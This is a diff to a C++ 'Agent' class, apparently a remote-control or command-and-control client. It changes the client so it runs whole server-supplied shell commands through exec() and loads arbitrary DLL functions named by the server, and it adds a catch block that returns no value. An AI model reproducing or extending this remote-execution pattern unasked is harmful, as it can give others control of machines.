@@ -168,8 +168,13 @@ void Agent::GetRequestFromServer()
 					++it;
 					if (!todo.compare("cmd"))
 					{
-						string action = *it;
-						responce = exec(action);
+						string action = "";
+						while (it != res.end())
+						{
+							action.append(*it + " ");
+							it++;
+						}
+						responce = action.empty() ? "" : exec(action);
 					}
 					else if (!todo.compare("func"))
 					{
@@ -345,16 +350,22 @@ void Agent::Cleanup()
 */
 string Agent::runDynamicFunction(string library, string function, string cmd)
 {
-	HINSTANCE hinstDLL = LoadLibrary(library.c_str());
-	LPGETNUMBER func = (LPGETNUMBER)GetProcAddress(hinstDLL, function.c_str());
-	string res;
-	if (func != NULL)
-	{
-		res = func(cmd);	
+	try {
+		HINSTANCE hinstDLL = LoadLibrary(library.c_str());
+		LPGETNUMBER func = (LPGETNUMBER)GetProcAddress(hinstDLL, function.c_str());
+		string res;
+		if (func != NULL)
+		{
+			res = func(cmd);
+		}
+		FreeLibrary(hinstDLL);
+		cout << "free " << GetLastError() << endl;
+		return res;
 	}
-	FreeLibrary(hinstDLL);
-	cout << "free " << GetLastError() << endl;
-	return res;
+	catch (...)
+	{
+
+	}
 }
 
 /*
